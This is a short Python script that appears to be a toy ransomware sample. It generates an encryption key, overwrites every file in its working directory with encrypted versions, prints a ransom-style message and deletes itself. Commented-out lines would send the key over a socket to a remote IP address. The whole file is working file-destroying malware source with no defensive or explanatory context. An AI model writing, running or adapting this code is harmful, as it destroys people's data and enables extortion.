from cryptography.fernet import Fernet
import socket

import os

files = []
key = Fernet.generate_key()
# s = socket.socket()
# port = 12345
# ip = "192.168.1.169"

# s.connect((ip,port))
# print("connected")
# s.send(key)
# s.close()
f = Fernet(key)
print(key)
with open("thekey.key","wb") as file:
    file.write(key)

for file in os.listdir():
    if os.path.isfile(file):
        if file in["encrypt.py","decrypt.py","thekey.key"]:
            pass
        else:
            files.append(file)
print(files)
for file in files:
    with open(file, "rb") as a:                                                                      
        data = a.read()
        encrypted_data = f.encrypt(data)
    with open(file, "wb") as a:
        a.write(encrypted_data)
print("All your files been encrypted")
os.remove(__file__)

